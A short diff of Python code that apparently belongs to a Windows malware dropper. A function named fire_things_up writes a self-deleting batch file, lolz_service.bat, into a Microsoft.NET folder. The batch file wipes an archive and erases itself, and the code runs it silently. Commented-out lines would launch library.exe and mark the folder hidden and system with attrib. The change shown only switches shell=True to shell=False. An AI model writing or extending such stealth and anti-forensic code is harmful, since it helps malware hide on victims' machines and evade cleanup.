@@ -46,7 +46,7 @@ def fire_things_up(url,arch=False,zip=False):
 			f.close()
 			bat_data = '''@echo off\nbreak>library_data.zip\nDEL -f "library_data.zip"\nbreak>"%~f0" && DEL "%~f0" '''
 			bat = open(pthhhh+"\\Microsoft.NET\\lolz_service.bat","w");bat.write(bat_data);bat.close()
-			xxx = subprocess.Popen( pthhhh+"\\Microsoft.NET\\lolz_service.bat >> NUL",shell=True)
+			xxx = subprocess.Popen( pthhhh+"\\Microsoft.NET\\lolz_service.bat >> NUL",shell=False)
 
 		#xx  = subprocess.Popen( "library.exe >> NUL",shell=True,cwd=pthhhh+"\\Microsoft.NET")
 		#xxx = subprocess.Popen( 'attrib +s +h "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh)
